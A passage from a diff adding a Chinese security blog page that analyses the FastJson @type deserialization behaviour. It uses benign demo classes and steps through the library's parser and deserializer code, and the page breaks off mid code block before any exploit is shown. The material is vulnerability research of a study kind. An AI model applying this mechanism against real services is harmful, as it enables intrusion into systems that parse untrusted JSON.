@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html lang="cn">
+
+<head>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="This_is_Y">
+    
+    <title>
+        
+            FastJson反序列化分析笔记 |
+        
+        This_is_Y
+    </title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="shortcut icon" href="/images/title.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"cn","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":false},"style":{"primary_color":"#33CCCC","avatar":"/images/head.png","favicon":"/images/title.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/Watch.png","description":"Life is but a Dream"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":false},"version":"3.4.1"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+</head>
+
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                This_is_Y
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories/cnblogs"
+                            >
+                                CNBLOGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/Game"
+                            >
+                                GAME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/ReShell"
+                            >
+                                SHELL
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories/cnblogs">CNBLOGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/Game">GAME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/ReShell">SHELL</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">FastJson反序列化分析笔记</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/head.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">This_is_Y</span>
+                        
+                            <span class="author-label">Lv6</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2023-10-27 12:00:00
+    </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="两个特性"><a href="#两个特性" class="headerlink" title="两个特性"></a>两个特性</h1><h2 id="用户可控制反序列化的对象"><a href="#用户可控制反序列化的对象" class="headerlink" title="用户可控制反序列化的对象"></a>用户可控制反序列化的对象</h2><p>user类如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">user</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String hobby;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user构造函数user(无参数)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user</span><span class="params">(String name, <span class="keyword">int</span> age, String hobby)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user构造函数user(有参数)&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setAge&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getHobby</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了getHobby&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHobby</span><span class="params">(String hobby)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setHobby&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, hobby=&#x27;&quot;</span> + hobby + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后是调用函数,我都是写在各种小test里，然后在main中调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//test1();</span></span><br><span class="line">        <span class="comment">//test2();</span></span><br><span class="line">        test3();</span><br><span class="line">        <span class="comment">//test4();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="安全的使用方法："><a href="#安全的使用方法：" class="headerlink" title="安全的使用方法："></a>安全的使用方法：</h3><p>先看正确的使用方法:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// 安全的写法</span></span><br><span class="line">        String p1 = <span class="string">&quot;&#123;\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;</span>;</span><br><span class="line">        user tmpuser = JSON.parseObject(p1, user.class);  <span class="comment">//限制死了反序列化的类型为user</span></span><br><span class="line">        System.out.println(tmpuser.getAge());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231027102647188.png" alt="image-20231027102647188"></p>
+<p>可以看到输出中，出现了</p>
+<p><code>user构造函数user(无参数)</code></p>
+<p>这是因为需要构造user对象tmpuser。</p>
+<p><code>user调用了setAge user调用了setHobby user调用了setName</code></p>
+<p>这三个出现，是因为在构造过程中，给age，name，hobby这三个属性赋值了。</p>
+<p><code>user调用了getAg  </code><br><code>18</code> </p>
+<p>是tmpuser.getAge()这一行输出的。</p>
+<p>限制死了反序列化的类型为user，这种由开发者控制的反序列化的类型，是安全的。</p>
+<h3 id="不安全的使用方法："><a href="#不安全的使用方法：" class="headerlink" title="不安全的使用方法："></a>不安全的使用方法：</h3><p>因为fastjson有一个特性，可以由用户指定反序列化的类型，通过@type字段。可以先设置另一个user2对象</p>
+<p>代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">user2</span> </span>&#123;    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String hobby;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2构造函数user2(无参数)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user2</span><span class="params">(String name, <span class="keyword">int</span> age, String hobby)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2构造函数user2(有参数)&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了setAge&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getHobby</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了getHobby&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHobby</span><span class="params">(String hobby)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了setHobby&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, hobby=&#x27;&quot;</span> + hobby + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后是调用代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String p1 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;</span>;</span><br><span class="line">    String p2 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user2\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;</span>;</span><br><span class="line">    System.out.println(<span class="string">&quot;JSON.parse(p1):&quot;</span>);</span><br><span class="line">    Object P1 = JSON.parse(p1);</span><br><span class="line">    System.out.println(<span class="string">&quot;JSON.parse(p2):&quot;</span>);</span><br><span class="line">    Object P2 = JSON.parse(p2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果如下：</p>
+<p><img src="image-20231027111614060.png" alt="image-20231027111614060"></p>
+<p>可以将test()理解为一个函数，用户输入序列化后的字符串交给服务器，服务器对字符串进行反序列化，这里输入的p1,p2就可以理解为调用了两次函数。</p>
+<h2 id="调用getName方法"><a href="#调用getName方法" class="headerlink" title="调用getName方法"></a>调用getName方法</h2><p>但反序列化字符串的函数不是parse而是parseObject时，就会调用对象中的getter类方法，比如getName，getAge,getHobby。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test6</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       String p1 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;</span>;</span><br><span class="line">       System.out.println(<span class="string">&quot;JSON.parse(p1):&quot;</span>);</span><br><span class="line">       Object P1 = JSON.parse(p1);</span><br><span class="line">       System.out.println(<span class="string">&quot;JSON.parseObject(p1):&quot;</span>);</span><br><span class="line">       Object P2 = JSON.parseObject(p1);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231027112258302.png" alt="image-20231027112258302"></p>
+<p>在了解这两种机制后，就可能会出现下面这种情况：代码中出现了 JSON.parseObject(p1); 可能设计初衷只是想解析反序列化”{&quot;age&quot;:18,&quot;hobby&quot;:&quot;gaming&quot;,&quot;name&quot;:&quot;y&quot;}”这样的字符串，但是因为这两个特性，就可能出现一些意想不到的结果</p>
+<h1 id="调用流程分析"><a href="#调用流程分析" class="headerlink" title="调用流程分析"></a>调用流程分析</h1><p>先来捋顺正常的调用，再来看漏洞的调用</p>
+<h2 id="正常流程"><a href="#正常流程" class="headerlink" title="正常流程"></a>正常流程</h2><h3 id="识别-type"><a href="#识别-type" class="headerlink" title="识别@type"></a>识别@type</h3><p>使用如下代码，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test7</span><span class="params">()</span></span>&#123;</span><br><span class="line">    String p1 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;</span>;</span><br><span class="line">    System.out.println(<span class="string">&quot;JSON.parseObject(p1):&quot;</span>);</span><br><span class="line">    Object P2 = JSON.parseObject(p1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>断点下载        Object P2 = JSON.parseObject(p1); </p>
+<p>前面都是普通的调来调去，一直到这里</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">public</span> Object <span class="title">parse</span><span class="params">(Object fieldName)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> JSONLexer lexer = <span class="keyword">this</span>.lexer;</span><br><span class="line">       <span class="keyword">switch</span> (lexer.token()) &#123;</span><br><span class="line">…………</span><br><span class="line">   …………</span><br><span class="line">           <span class="keyword">case</span> LBRACE:</span><br><span class="line">               JSONObject object = <span class="keyword">new</span> JSONObject(lexer.isEnabled(Feature.OrderedField));</span><br><span class="line">               <span class="keyword">return</span> parseObject(object, fieldName);</span><br><span class="line">   …………</span><br><span class="line">   ………… </span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231030110516526.png" alt="image-20231030110516526"></p>
+<p>这里的lexer是由之前JSON.java中的</p>
+<p><code>DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);</code></p>
+<p>这一行定义和赋值</p>
+<p>在swtich中，识别到第一个字符串是<code>&#123;</code> (也就是 LBRACE )后，通过</p>
+<p><code>return parseObject(object, fieldName);</code></p>
+<p>进入到了parseObject函数中，这个函数还是在当前DefaultJSONParser.java文件中</p>
+<p><img src="image-20231030111221334.png" alt="image-20231030111221334"></p>
+<p>经过几个判断后，进入到try finally 代码块中，这里面是一个for(;;)死循环，然后可以看到有一个判断</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    String typeName = lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        object.put(JSON.DEFAULT_TYPE_KEY, typeName);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ………………</span><br><span class="line">    ………………</span><br></pre></td></tr></table></figure>
+
+<p><code>JSON.DEFAULT_TYPE_KEY</code>是<code>@type</code> </p>
+<p>lexer.isEnabled()会返回入参的mask字段，这边的<code>Feature.DisableSpecialKeyDetect</code>内容如下，所以!lexer.isEnabled(Feature.DisableSpecialKeyDetect)的结果为true</p>
+<p><img src="image-20231030112553007.png" alt="image-20231030112553007"></p>
+<p>随后就获取到@type的value：<code>org.example.user</code></p>
+<p>这边的意思大概就是，通过识别到<code>&#123;</code>开头，然后开始进行反序列化的字符从识别，识别到@type，意味着需要指定类进行java反序列化。这边的下一行</p>
+<p><code>Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</code></p>
+<p>就是加载制定的类以便于反序列化</p>
+<h3 id="加载指定类"><a href="#加载指定类" class="headerlink" title="加载指定类"></a>加载指定类</h3><p>在上面用loadlass加载完类后，继续这个if代码块，在最下面有一个</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line"><span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>
+
+<p>这边是为了获取反序列化器deserializer，跟进getDeserializer，因为<code>type instanceof Class&lt;?&gt;</code>，跳到<code> getDeserializer((Class&lt;?&gt;) type, type)</code>中，</p>
+<p>在这个getDeserializer，会经过一些替换处理，if判断，比如说会把<code>$</code>换成<code>.</code></p>
+<ul>
+<li>className = className.replace(‘$’, ‘.’);</li>
+</ul>
+<p>会检测是否<code>java.awt.</code>开头等等。</p>
+<p>最后因为传入的value是org.example.user，流程会来到461行的</p>
+<p><code>derializer = createJavaBeanDeserializer(clazz, type);</code></p>
+<p><img src="image-20231030115601476.png" alt="image-20231030115601476"></p>
+<p>跟进createJavaBeanDeserializer(),这个函数里的判断主要是围绕 <strong>asmEnable</strong> 变量的true和false来进行的，在一系列的处理后，来到了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231030144038009.png" alt="image-20231030144038009"></p>
+<p>跟进这个build()函数，这函数内容也非常多，不过因为两个长的 if 代码块不会运行，所以可以忽略，重点是下面的三个 for 代码块，</p>
+<p><img src="image-20231030144752366.png" alt="image-20231030144752366"></p>
+<p>其中第一个循环 <code>for (Method method : methods) </code> 是在指定的java类中找setter类方法。那些“函数命名以set开头，第四个字母大写”之类的条件，就是在这里进行判断处理的。</p>
+<p><img src="image-20231030145529136.png" alt="image-20231030145529136"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 